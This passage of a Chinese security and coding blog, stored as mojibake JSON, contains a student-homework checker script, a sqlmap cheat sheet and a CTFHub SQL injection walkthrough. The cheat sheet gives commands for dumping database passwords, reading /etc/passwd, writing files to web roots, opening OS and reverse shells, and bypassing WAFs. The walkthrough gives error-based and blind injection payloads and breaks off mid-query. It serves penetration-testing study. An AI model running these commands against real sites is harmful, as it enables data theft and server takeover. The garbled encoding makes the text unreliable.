‡é¢˜æ¥æŸ¥æ‰¾å­¦å·æ‰€åœ¨çš„åˆ—ã€‚æˆ‘ä»¬è¿˜éœ€è¦æ ¹æ®å­¦å·æ¥æå–å§“åï¼Œå› ä¸ºæ–‡ä»¶å¤¹ä¸­çš„PDFæ–‡ä»¶åæ˜¯â€œå­¦å·-å§“åâ€æ ¼å¼ã€‚ \n\nâ€‹          è¿™ä¸ªç¨‹åºé¦–å…ˆæŸ¥æ‰¾Excelæ–‡ä»¶ä¸­åŒ…å«â€œå­¦å·â€æ ‡é¢˜çš„åˆ—ï¼Œå¹¶è®°å½•è¯¥åˆ—çš„åˆ—å­—æ¯ã€‚ç„¶åå®ƒéå†æ–‡ä»¶å¤¹ä¸­çš„PDFæ–‡ä»¶ï¼Œå¯¹äºæ¯ä¸ªPDFæ–‡ä»¶ï¼Œå®ƒä¼šæå–å­¦ç”Ÿå­¦å·å’Œå§“åï¼Œå¹¶å°†å­¦å·å’Œå§“åæ·»åŠ åˆ°å·²æäº¤å­—å…¸ä¸­ã€‚ç„¶åå®ƒéå†Excelæ–‡ä»¶ä¸­çš„æ¯ä¸€è¡Œï¼Œä½¿ç”¨å­¦å·åˆ—çš„åˆ—å­—æ¯æ¥æå–å­¦ç”Ÿå­¦å·ï¼Œå¹¶ä½¿ç”¨å­¦å·åœ¨å·²æäº¤å­—å…¸ä¸­æŸ¥æ‰¾å¯¹åº”çš„å§“åï¼Œå¹¶æ‰“å°å‡ºç›¸åº”çš„æäº¤çŠ¶æ€ã€‚ \n\n## ä»£ç å¤ç°\n\n```python\n\nimport openpyxl\nimport os\n\n# å®šä¹‰æ–‡ä»¶å¤¹è·¯å¾„å’ŒExcelæ–‡ä»¶è·¯å¾„\nfolder_path = \"D:\\\\University\\\\Sophomore_second\\\\R222A1035120001å·¥ç¨‹é¡¹ç›®ç®¡ç†ä¸ç»æµå†³ç­–\\\\R222A1035120001å·¥ç¨‹é¡¹ç›®ç®¡ç†ä¸ç»æµå†³ç­–\"\nexcel_path = \"D:\\\\University\\\\Sophomore_second\\\\R222A1035120001å·¥ç¨‹é¡¹ç›®ç®¡ç†ä¸ç»æµå†³ç­–\\\\R222A1035120001å­¦ç”Ÿåå•0310.xlsx\"\n\n# æ‰“å¼€Excelæ–‡ä»¶\nwb = openpyxl.load_workbook(excel_path)\nsheet = wb.active\n\n# åˆ›å»ºä¸€ä¸ªç©ºçš„å­—å…¸æ¥å­˜å‚¨å·²ç»æäº¤ä½œä¸šçš„å­¦ç”Ÿå­¦å·\nsubmitted = {}\n\n# æŸ¥æ‰¾Excelæ–‡ä»¶ä¸­å­¦å·æ‰€åœ¨çš„åˆ—\nheaders = [cell.value for cell in sheet[1]]\nif \"å­¦å·\" not in headers:\n    print(\"Error: cannot find the column containing student IDs.\")\n    exit()\n\nstudent_id_column = headers.index(\"å­¦å·\") + 1\n\n# éå†æ–‡ä»¶å¤¹ä¸­çš„PDFæ–‡ä»¶ï¼Œæ£€æŸ¥æ˜¯å¦å­˜åœ¨æŒ‰å­¦ç”Ÿå­¦å·å‘½åçš„PDFæ–‡ä»¶\nfor filename in os.listdir(folder_path):\n    if filename.endswith(\".pdf\"):\n        student_id, student_name = filename[:-4].rsplit(\"-\", 1) # åˆ†ç¦»å­¦å·å’Œå§“å\n        submitted[student_id] = student_name\n\n# éå†Excelæ–‡ä»¶ä¸­çš„å­¦ç”Ÿåå•ï¼Œæ£€æŸ¥å“ªäº›å­¦ç”Ÿå·²ç»æäº¤ä½œä¸š\nfor row in sheet.iter_rows(min_row=2, values_only=True):\n    student_id = str(row[student_id_column - 1])\n    if student_id in submitted:\n        pass\n    else:\n        print(f\"{row[1]} ({student_id}) has not submitted the homework.\")\n\n\n```\n","tags":["python","excel","openpyxl","os"],"categories":["python"]},{"title":"sqlmap å¸¸ç”¨æŒ‡ä»¤","url":"/sqlmap-å¸¸ç”¨æŒ‡ä»¤/","content":"\n# sqlmap å¸¸ç”¨æŒ‡ä»¤\n\nSQLMap æ˜¯ä¸€æ¬¾è‡ªåŠ¨åŒ–çš„SQLæ³¨å…¥æµ‹è¯•å·¥å…·ï¼Œåœ¨ kali ä¸Šå·²é›†æˆ\n\n```bash\nåŸºæœ¬æ“ä½œç¬”è®°ï¼š-u  #æ³¨å…¥ç‚¹ \n-f  #æŒ‡çº¹åˆ¤åˆ«æ•°æ®åº“ç±»å‹ \n-b  #è·å–æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯ \n-p  #æŒ‡å®šå¯æµ‹è¯•çš„å‚æ•°(?page=1&id=2 -p \"page,id\") \n-D \"\"  #æŒ‡å®šæ•°æ®åº“å \n-T \"\"  #æŒ‡å®šè¡¨å \n-C \"\"  #æŒ‡å®šå­—æ®µ \n-s \"\"  #ä¿å­˜æ³¨å…¥è¿‡ç¨‹åˆ°ä¸€ä¸ªæ–‡ä»¶,è¿˜å¯ä¸­æ–­ï¼Œä¸‹æ¬¡æ¢å¤åœ¨æ³¨å…¥(ä¿å­˜ï¼š-s \"xx.log\"ã€€ã€€æ¢å¤:-s \"xx.log\" --resume) \n--level=(1-5) #è¦æ‰§è¡Œçš„æµ‹è¯•æ°´å¹³ç­‰çº§ï¼Œé»˜è®¤ä¸º1 \n\t--level1ï¼šé»˜è®¤çš„ç­‰çº§ï¼Œä¼šè¿›è¡ŒåŸºæœ¬çš„æµ‹è¯•ï¼ŒåŒ…æ‹¬GETå’ŒPOSTæ–¹å¼ã€‚\n\t--level2: åœ¨åŸæœ‰çš„åŸºç¡€ä¸Šå¢åŠ å¯¹cookieçš„æ£€æµ‹ã€‚ \n\t--level3: å¢åŠ å¯¹User Agentã€Referer çš„æ£€æµ‹ \n\t--lever4: æ›´å¤šçš„payload \n\t--level5: æœ€é«˜ç­‰çº§ï¼ŒåŒ…å«æ‰€æœ‰çš„payload,ä¼šå°è¯•è‡ªåŠ¨ç ´è§£å‡ºcookieã€xffç­‰å¤´éƒ¨æ³¨å…¥ã€‚\n\t\n--risk=(0-3)  #æµ‹è¯•æ‰§è¡Œçš„é£é™©ç­‰çº§ï¼Œé»˜è®¤ä¸º1 \n--time-sec=(2,5) #å»¶è¿Ÿå“åº”ï¼Œé»˜è®¤ä¸º5 \n--data #é€šè¿‡POSTå‘é€æ•°æ® \n--columns        #åˆ—å‡ºå­—æ®µ \n--current-user   #è·å–å½“å‰ç”¨æˆ·åç§° \n--current-db     #è·å–å½“å‰æ•°æ®åº“åç§° \n--users          #åˆ—æ•°æ®åº“æ‰€æœ‰ç”¨æˆ· \n--passwords      #æ•°æ®åº“ç”¨æˆ·æ‰€æœ‰å¯†ç  \n--privileges     #æŸ¥çœ‹ç”¨æˆ·æƒé™(--privileges -U root) \n-U               #æŒ‡å®šæ•°æ®åº“ç”¨æˆ· \n--dbs            #åˆ—å‡ºæ‰€æœ‰æ•°æ®åº“ \n--tables -D \"\"   #åˆ—å‡ºæŒ‡å®šæ•°æ®åº“ä¸­çš„è¡¨ \n--columns -T \"user\" -D \"mysql\"      #åˆ—å‡ºmysqlæ•°æ®åº“ä¸­çš„userè¡¨çš„æ‰€æœ‰å­—æ®µ \n--dump-all            #åˆ—å‡ºæ‰€æœ‰æ•°æ®åº“æ‰€æœ‰è¡¨ \n--exclude-sysdbs      #åªåˆ—å‡ºç”¨æˆ·è‡ªå·±æ–°å»ºçš„æ•°æ®åº“å’Œè¡¨ \n--dump -T \"\" -D \"\" -C \"\"   #åˆ—å‡ºæŒ‡å®šæ•°æ®åº“çš„è¡¨çš„å­—æ®µçš„æ•°æ®(--dump -T users -D master -C surname) \n--dump -T \"\" -D \"\" --start 2 --top 4  # åˆ—å‡ºæŒ‡å®šæ•°æ®åº“çš„è¡¨çš„2-4å­—æ®µçš„æ•°æ® \n--dbms    #æŒ‡å®šæ•°æ®åº“(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) \n--os      #æŒ‡å®šç³»ç»Ÿ(Linux,Windows) \n-v  #è¯¦ç»†çš„ç­‰çº§(0-6) \n    0ï¼šåªæ˜¾ç¤ºPythonçš„å›æº¯ï¼Œé”™è¯¯å’Œå…³é”®æ¶ˆæ¯ã€‚ \n    1ï¼šæ˜¾ç¤ºä¿¡æ¯å’Œè­¦å‘Šæ¶ˆæ¯ã€‚ \n    2ï¼šæ˜¾ç¤ºè°ƒè¯•æ¶ˆæ¯ã€‚ \n    3ï¼šæœ‰æ•ˆè½½è·æ³¨å…¥ã€‚ \n    4ï¼šæ˜¾ç¤ºHTTPè¯·æ±‚ã€‚ \n    5ï¼šæ˜¾ç¤ºHTTPå“åº”å¤´ã€‚ \n    6ï¼šæ˜¾ç¤ºHTTPå“åº”é¡µé¢çš„å†…å®¹ \n--privileges  #æŸ¥çœ‹æƒé™ \n--is-dba      #æ˜¯å¦æ˜¯æ•°æ®åº“ç®¡ç†å‘˜ \n--roles       #æšä¸¾æ•°æ®åº“ç”¨æˆ·è§’è‰² \n--udf-inject  #å¯¼å…¥ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ï¼ˆè·å–ç³»ç»Ÿæƒé™ï¼‰ \n--union-check  #æ˜¯å¦æ”¯æŒunion æ³¨å…¥ \n--union-cols #union æŸ¥è¯¢è¡¨è®°å½• \n--union-test #union è¯­å¥æµ‹è¯• \n--union-use  #é‡‡ç”¨union æ³¨å…¥ \n--union-tech orderby #unioné…åˆorder by \n--data \"\" #POSTæ–¹å¼æäº¤æ•°æ®(--data \"page=1&id=2\") \n--cookie \"ç”¨;å·åˆ†å¼€\"      #cookieæ³¨å…¥(--cookies=\"PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low\") \n--referer \"\"     #ä½¿ç”¨refereræ¬ºéª—(--referer \"http://www.baidu.com\") \n--user-agent \"\"  #è‡ªå®šä¹‰user-agent \n--proxy \"http://127.0.0.1:8118\" #ä»£ç†æ³¨å…¥ \n--string=\"\"    #æŒ‡å®šå…³é”®è¯,å­—ç¬¦ä¸²åŒ¹é…. \n--threads ã€€ã€€  #é‡‡ç”¨å¤šçº¿ç¨‹(--threads 3) \n--sql-shell    #æ‰§è¡ŒæŒ‡å®šsqlå‘½ä»¤ \n--sql-query    #æ‰§è¡ŒæŒ‡å®šçš„sqlè¯­å¥(--sql-query \"SELECT password FROM mysql.user WHERE user = 'root' LIMIT 0, 1\" ) \n--file-read    #è¯»å–æŒ‡å®šæ–‡ä»¶ \n--file-write   #å†™å…¥æœ¬åœ°æ–‡ä»¶(--file-write /test/test.txt --file-dest /var/www/html/1.txt;å°†æœ¬åœ°çš„test.txtæ–‡ä»¶å†™å…¥åˆ°ç›®æ ‡çš„1.txt) \n--file-dest    #è¦å†™å…¥çš„æ–‡ä»¶ç»å¯¹è·¯å¾„ \n--os-cmd=id    #æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ \n--os-shell     #ç³»ç»Ÿäº¤äº’shell \n--os-pwn       #åå¼¹shell(--os-pwn --msf-path=/opt/framework/msf3/) \n--msf-path=    #matesploitç»å¯¹è·¯å¾„(--msf-path=/opt/framework/msf3/) \n--os-smbrelay  # \n--os-bof       # \n--reg-read     #è¯»å–winç³»ç»Ÿæ³¨å†Œè¡¨ \n--priv-esc     # \n--time-sec=    #å»¶è¿Ÿè®¾ç½® é»˜è®¤--time-sec=5 ä¸º5ç§’ \n-p \"user-agent\" --user-agent \"sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)\"  #æŒ‡å®šuser-agentæ³¨å…¥ \n--eta          #ç›²æ³¨ \n/pentest/database/sqlmap/txt/\ncommon-columns.txtã€€ã€€å­—æ®µå­—å…¸ã€€ã€€ã€€ \ncommon-outputs.txt \ncommon-tables.txt      è¡¨å­—å…¸ \nkeywords.txt \noracle-default-passwords.txt \nuser-agents.txt \nwordlist.txt \n\nå¸¸ç”¨è¯­å¥ :\n1./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db --users --passwords --dbs -v 0 \n2./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --passwords -U root --union-use -v 2 \n3./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -T users -C username -D userdb --start 2 --stop 3 -v 2 \n4./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -C \"user,pass\"  -v 1 --exclude-sysdbs \n5./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --sql-shell -v 2 \n6./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-read \"c:\\boot.ini\" -v 2 \n7./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-write /test/test.txt --file-dest /var/www/html/1.txt -v 2 \n8./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-cmd \"id\" -v 1 \n9./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-shell --union-use -v 2 \n10./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 --priv-esc -v 1 \n11./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 -v 1 \n12./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-bof --msf-path=/opt/framework/msf3 -v 1 \n13./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --reg-add --reg-key=\"HKEY_LOCAL_NACHINE\\SOFEWARE\\sqlmap\" --reg-value=Test --reg-type=REG_SZ --reg-data=1 \n14./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --eta \n15./sqlmap.py -u \"http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1\" -p id --prefix \"')\" --suffix \"AND ('abc'='abc\"\n16./sqlmap.py -u \"http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1\" --auth-type Basic --auth-cred \"testuser:testpass\"\n17./sqlmap.py -l burp.log --scope=\"(www)?\\.target\\.(com|net|org)\"\n18./sqlmap.py -u \"http://192.168.136.131/sqlmap/mysql/get_int.php?id=1\" --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3 \n19./sqlmap.py -u \"http://192.168.136.131/sqlmap/mssql/get_int.php?id=1\" --sql-query \"SELECT 'foo'\" -v 1 \n20./sqlmap.py -u \"http://192.168.136.129/mysql/get_int_4.php?id=1\" --common-tables -D testdb --banner \n21./sqlmap.py -u \"http://192.168.136.129/mysql/get_int_4.php?id=1\" --cookie=\"PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low\" --string='xx' --dbs --level=3 -p \"uid\"\n\nç®€å•çš„æ³¨å…¥æµç¨‹ :\n1.è¯»å–æ•°æ®åº“ç‰ˆæœ¬ï¼Œå½“å‰ç”¨æˆ·ï¼Œå½“å‰æ•°æ®åº“ \nsqlmap -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1 \n2.åˆ¤æ–­å½“å‰æ•°æ®åº“ç”¨æˆ·æƒé™ \nsqlmap -u http://www.xxxxx.com/test.php?p=2 --privileges -U ç”¨æˆ·å -v 1 \nsqlmap -u http://www.xxxxx.com/test.php?p=2 --is-dba -U ç”¨æˆ·å -v 1 \n3.è¯»å–æ‰€æœ‰æ•°æ®åº“ç”¨æˆ·æˆ–æŒ‡å®šæ•°æ®åº“ç”¨æˆ·çš„å¯†ç  \nsqlmap -u http://www.xxxxx.com/test.php?p=2 --users --passwords -v 2 \nsqlmap -u http://www.xxxxx.com/test.php?p=2 --passwords -U root -v 2 \n4.è·å–æ‰€æœ‰æ•°æ®åº“ \nsqlmap -u http://www.xxxxx.com/test.php?p=2 --dbs -v 2 \n5.è·å–æŒ‡å®šæ•°æ®åº“ä¸­çš„æ‰€æœ‰è¡¨ \nsqlmap -u http://www.xxxxx.com/test.php?p=2 --tables -D mysql -v 2 \n6.è·å–æŒ‡å®šæ•°æ®åº“åä¸­æŒ‡å®šè¡¨çš„å­—æ®µ \nsqlmap -u http://www.xxxxx.com/test.php?p=2 --columns -D mysql -T users -v 2 \n7.è·å–æŒ‡å®šæ•°æ®åº“åä¸­æŒ‡å®šè¡¨ä¸­æŒ‡å®šå­—æ®µçš„æ•°æ® \nsqlmap -u http://www.xxxxx.com/test.php?p=2 --dump -D mysql -T users -C \"username,password\" -s \"sqlnmapdb.log\" -v 2 \n8.file-readè¯»å–webæ–‡ä»¶ \nsqlmap -u http://www.xxxxx.com/test.php?p=2 --file-read \"/etc/passwd\" -v 2 \n9.file-writeå†™å…¥æ–‡ä»¶åˆ°web \nsqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --fileä½¿ç”¨sqlmapç»•è¿‡é˜²ç«å¢™è¿›è¡Œæ³¨å…¥æµ‹è¯•\n```\n\n# sqlmap å¸¸ç”¨ç»•è¿‡è„šæœ¬\n\nä½¿ç”¨æ–¹æ³• `--tamper xxx.py`\n\n```bash\napostrophemask.py                         ç”¨UTF-8å…¨è§’å­—ç¬¦æ›¿æ¢å•å¼•å·å­—ç¬¦\n\napostrophenullencode.py                   ç”¨éæ³•åŒå­—èŠ‚unicodeå­—ç¬¦æ›¿æ¢å•å¼•å·å­—ç¬¦\n\nappendnullbyte.py                         åœ¨payloadæœ«å°¾æ·»åŠ ç©ºå­—ç¬¦ç¼–ç \n\nbase64encode.py                           å¯¹ç»™å®šçš„payloadå…¨éƒ¨å­—ç¬¦ä½¿ç”¨Base64ç¼–ç \n\nbetween.py                                åˆ†åˆ«ç”¨â€œNOT BETWEEN 0 AND \n#â€æ›¿æ¢å¤§äºå·â€œ>â€ï¼Œâ€œBETWEEN # AND #â€æ›¿æ¢ç­‰äºå·â€œ=â€\n\nbluecoat.py              åœ¨SQLè¯­å¥ä¹‹åç”¨æœ‰æ•ˆçš„éšæœºç©ºç™½ç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦ï¼Œéšåç”¨â€œLIKEâ€æ›¿æ¢ç­‰äºå·â€œ=â€\n\nchardoubleencode.py      å¯¹ç»™å®šçš„payloadå…¨éƒ¨å­—ç¬¦ä½¿ç”¨åŒé‡URLç¼–ç ï¼ˆä¸å¤„ç†å·²ç»ç¼–ç çš„å­—ç¬¦ï¼‰\n\ncharencode.py            å¯¹ç»™å®šçš„payloadå…¨éƒ¨å­—ç¬¦ä½¿ç”¨URLç¼–ç ï¼ˆä¸å¤„ç†å·²ç»ç¼–ç çš„å­—ç¬¦ï¼‰\n\ncharunicodeencode.py     å¯¹ç»™å®šçš„payloadçš„éç¼–ç å­—ç¬¦ä½¿ç”¨Unicode ç¼–ç ï¼ˆä¸å¤„ç†å·²ç»ç¼–ç çš„å­—ç¬¦ï¼‰\n\nconcat2concatws.py  ç”¨â€œCONCAT_WS(MID(CHAR(0), 0, 0), A,B)â€æ›¿æ¢åƒâ€œCONCAT(A, B)â€çš„å®ä¾‹\n\nequaltolike.py          ç”¨â€œLIKEâ€è¿ç®—ç¬¦æ›¿æ¢å…¨éƒ¨ç­‰äºå·â€œ=â€\n\ngreatest.py             ç”¨â€œGREATESTâ€å‡½æ•°æ›¿æ¢å¤§äºå·â€œ>â€\n\nhalfversionedmorekeywords.py         åœ¨æ¯ä¸ªå…³é”®å­—ä¹‹å‰æ·»åŠ MySQLæ³¨é‡Š\n\nifnull2ifisnull.py                   ç”¨â€œIF(ISNULL(A), B, A)â€æ›¿æ¢åƒâ€œIFNULL(A, B)â€çš„å®ä¾‹\n\nlowercase.py                         ç”¨å°å†™å€¼æ›¿æ¢æ¯ä¸ªå…³é”®å­—å­—ç¬¦\n\nmodsecurityversioned.py              ç”¨æ³¨é‡ŠåŒ…å›´å®Œæ•´çš„æŸ¥è¯¢\n\nmodsecurityzeroversioned.py          ç”¨å½“ä¸­å¸¦æœ‰æ•°å­—é›¶çš„æ³¨é‡ŠåŒ…å›´å®Œæ•´çš„æŸ¥è¯¢\n\nmultiplespaces.py                    åœ¨SQLå…³é”®å­—å‘¨å›´æ·»åŠ å¤šä¸ªç©ºæ ¼\n\nnonrecursivereplacement.py           ç”¨representationsæ›¿æ¢é¢„å®šä¹‰SQLå…³é”®å­—ï¼Œé€‚ç”¨äºè¿‡æ»¤å™¨\n\noverlongutf8.py                      è½¬æ¢ç»™å®šçš„payloadå½“ä¸­çš„æ‰€æœ‰å­—ç¬¦\n\npercentage.py                        åœ¨æ¯ä¸ªå­—ç¬¦ä¹‹å‰æ·»åŠ ä¸€ä¸ªç™¾åˆ†å·\n\nrandomcase.py                        éšæœºè½¬æ¢æ¯ä¸ªå…³é”®å­—å­—ç¬¦çš„å¤§å°å†™\n\nrandomcomments.py                    å‘SQLå…³é”®å­—ä¸­æ’å…¥éšæœºæ³¨é‡Š\n\nsecuresphere.py                      æ·»åŠ ç»è¿‡ç‰¹æ®Šæ„é€ çš„å­—ç¬¦ä¸²\n\nsp_password.pyå‘payloadæœ«å°¾æ·»åŠ â€œsp_passwordâ€ for automatic obfuscation from DBMS logs\n\nspace2comment.py                     ç”¨â€œ//â€æ›¿æ¢ç©ºæ ¼ç¬¦**\n\nspace2dash.py                     ç”¨ç ´æŠ˜å·æ³¨é‡Šç¬¦â€œâ€“â€å…¶æ¬¡æ˜¯ä¸€ä¸ªéšæœºå­—ç¬¦ä¸²å’Œä¸€ä¸ªæ¢è¡Œç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦\n\nspace2hash.py                     ç”¨ç£…æ³¨é‡Šç¬¦â€œ#â€å…¶æ¬¡æ˜¯ä¸€ä¸ªéšæœºå­—ç¬¦ä¸²å’Œä¸€ä¸ªæ¢è¡Œç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦\n\nspace2morehash.py                 ç”¨ç£…æ³¨é‡Šç¬¦â€œ#â€å…¶æ¬¡æ˜¯ä¸€ä¸ªéšæœºå­—ç¬¦ä¸²å’Œä¸€ä¸ªæ¢è¡Œç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦\n\nspace2mssqlblank.py               ç”¨ä¸€ç»„æœ‰æ•ˆçš„å¤‡é€‰å­—ç¬¦é›†å½“ä¸­çš„éšæœºç©ºç™½ç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦\n\nspace2mssqlhash.py                ç”¨ç£…æ³¨é‡Šç¬¦â€œ#â€å…¶æ¬¡æ˜¯ä¸€ä¸ªæ¢è¡Œç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦\n\nspace2mysqlblank.py               ç”¨ä¸€ç»„æœ‰æ•ˆçš„å¤‡é€‰å­—ç¬¦é›†å½“ä¸­çš„éšæœºç©ºç™½ç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦\n\nspace2mysqldash.py                ç”¨ç ´æŠ˜å·æ³¨é‡Šç¬¦â€œâ€“â€å…¶æ¬¡æ˜¯ä¸€ä¸ªæ¢è¡Œç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦\n\nspace2plus.py                     ç”¨åŠ å·â€œ+â€æ›¿æ¢ç©ºæ ¼ç¬¦\n\nspace2randomblank.py              ç”¨ä¸€ç»„æœ‰æ•ˆçš„å¤‡é€‰å­—ç¬¦é›†å½“ä¸­çš„éšæœºç©ºç™½ç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦\n\nunionalltounion.py                ç”¨â€œUNION SELECTâ€æ›¿æ¢â€œUNION ALL SELECTâ€\n\nunmagicquotes.py                  ç”¨ä¸€ä¸ªå¤šå­—èŠ‚ç»„åˆ%bf%27å’Œæœ«å°¾é€šç”¨æ³¨é‡Šä¸€èµ·æ›¿æ¢ç©ºæ ¼ç¬¦\n\nvarnish.py                        æ·»åŠ ä¸€ä¸ªHTTPå¤´â€œX-originating-IPâ€æ¥ç»•è¿‡WAF\n\nversionedkeywords.py              ç”¨MySQLæ³¨é‡ŠåŒ…å›´æ¯ä¸ªéå‡½æ•°å…³é”®å­—\n\nversionedmorekeywords.py          ç”¨MySQLæ³¨é‡ŠåŒ…å›´æ¯ä¸ªå…³é”®å­—\n\nxforwardedfor.py                  æ·»åŠ ä¸€ä¸ªä¼ªé€ çš„HTTPå¤´â€œX-Forwarded-Forâ€æ¥ç»•è¿‡WAF\n```\n\n","tags":["sqlæ³¨å…¥","sqlmap"],"categories":["Web"]},{"title":"ä¾‹é¢˜(æ‰‹å·¥æ³¨å…¥)","url":"/ä¾‹é¢˜-æ‰‹å·¥æ³¨å…¥/","content":"\n# ä¾‹é¢˜(æ‰‹å·¥æ³¨å…¥)\n\n### ä¾‹é¢˜1ï¼šæŠ¥é”™æ³¨å…¥(ctfhub)\n\n![image-20230714202120498](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230714202120498-1691289107543-2.png)\n\næŠ¥é”™æ³¨å…¥ï¼šé¦–å…ˆæƒ³åˆ° ``updatexml`` \n\n```sql\n1 union select updatexml(1,concat(0x7e,(select database()),0x7e),1)\n```\n\n![image-20230714202501659](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230714202501659-1691289107544-4.png)\n\næ­¤æ—¶æŸ¥è¯¢åˆ°æ•°æ®åº“åï¼šsqli\n\n```sql\n1 union select updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=\"sqli\"),0x7e),1)\n```\n\n![image-20230714202632846](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230714202632846-1691289107544-5.png)\n\næŸ¥è¯¢åˆ°è¡¨åï¼šflag è¿›è€ŒæŸ¥è¯¢åˆ—åï¼š\n\n```sql\n1 union select updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=\"flag\"),0x7e),1)\n```\n\n![image-20230714202802542](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230714202802542-1691289107543-1.png)\n\næœ€åæŸ¥è¯¢ åˆ—åä¸º flag çš„ä¿¡æ¯\n\n```sql\n1 union select updatexml(1,concat(0x7e,(select flag from flag),0x7e),1)\n```\n\n![image-20230714202857595](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230714202857595-1691289107544-3.png)\n\n### ä¾‹é¢˜2ï¼šå¸ƒå°”ç›²æ³¨(ctfhub)\n\n> 1. `substr(str,from,length)`:è¿”å›ä»ä¸‹æ ‡ä¸ºfromæˆªå–é•¿åº¦ä¸ºlengthçš„strå­ä¸²ã€‚**å…¶ä¸­ï¼Œé¦–å­—ç¬¦ä¸‹æ ‡ä¸º1**\n> 2. `length(str)`:è¿”å›strä¸²é•¿åº¦\n\n\n\n**1. é¦–å…ˆ  `` çˆ†æ•°æ®åº“åé•¿åº¦`` ä½¿ç”¨`` length(database()) = i `` è·å–æ•°æ®åº“åçš„é•¿åº¦**\n\n```sql\n1 and length(database())=1\n......\n1 and length(database())=4\n```\n\n![image-20230714210008799](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230714210008799.png)\n\n**2. æ ¹æ®æ•°æ®åº“åé•¿åº¦çˆ†åº“å ä½¿ç”¨ ` substr(database(),i,1)`**\n\n```sql\n?id=1 and substr(database(),1,1)=â€˜aâ€™\n#query_error\n...\n?id=1 and substr(database(),1,1)=â€˜sâ€™\n#query_success\n#åº“åç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯s\n...\n?id=1 and substr(database(),4,1)=â€˜iâ€™\n#query_success\n#åº“åç¬¬å››ä¸ªå­—ç¬¦æ˜¯i\n\n#åº“åæ˜¯sqli\n```\n\n![image-20230714210628752](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230714210628752.png)\n\n**3. è·å–æ•°æ®åº“å†…çš„è¡¨æ•°é‡ï¼Œä½¿ç”¨mysqlçš„æŸ¥è¯¢è¯­å¥`select COUNT(*)`ã€‚åŒæ ·ï¼Œè¦ä¸€ä¸ª1åˆ°æ— ç©·çš„å¾ªç¯**\n\n```sql\n?id=1 and (select COUNT(*) from information_schema.tables where table_schema=database())=1\n#query_error\n\n?id=1 and (select COUNT(*) from information_schema.tables where table_schema=database())=2\n#query_success\n#å½“å‰åº“sqliæœ‰2å¼ è¡¨\n```\n\n![image-20230714211308430](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230714211308430.png)\n\n**4. ä½¿ç”¨`limit i ,1`é™å®šæ˜¯ç¬¬å‡ å¼ è¡¨ï¼Œå†…åµŒå¾ªç¯jä»1åˆ°æ— ç©·ï¼ˆç©·ä¸¾æ‰€æœ‰è¡¨åé•¿åº¦å¯èƒ½æ€§ï¼‰å°è¯•è·å–æ¯ä¸ªè¡¨çš„è¡¨åé•¿åº¦**\n\n```sql\n?id=1 and length(select table_name from information_schema.tables where table_schema=database() limit 0,1)=1\n#query_error\n...\n?id=1 and length(select table_name from information_schema.tables where table_schema=database() limit 0,1)=4\n#query_success\n#å½“å‰åº“sqliçš„ç¬¬ä¸€å¼ è¡¨è¡¨åé•¿åº¦ä¸º4\n...\n?id=1 and length(select table_name from information_schema.tables where table_schema=database() limit 1,1)=4\n#query_success\n#å½“å‰åº“sqliçš„ç¬¬äºŒå¼ è¡¨è¡¨åé•¿åº¦ä¸º4\n\n#å½“å‰åº“sqliæœ‰ä¸¤å¼ è¡¨â€™newsâ€™å’Œâ€™flagâ€˜ï¼Œè¡¨åé•¿åº¦å‡ä¸º4\n```\n\n\n\nè¡¨åé•¿åº¦çˆ†è¡¨å`substr((selectâ€¦limit i,1),j,1)`\n\n```sql\n?id=1 and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)='a'\n#query_error\n...\n?id=1 and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)='n'\n#query_success\n#å½“å‰åº“sqliçš„ç¬¬ä¸€å¼ è¡¨è¡¨åç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯n\n...\n?id=1 and substr((select table_name from information_schema.tables 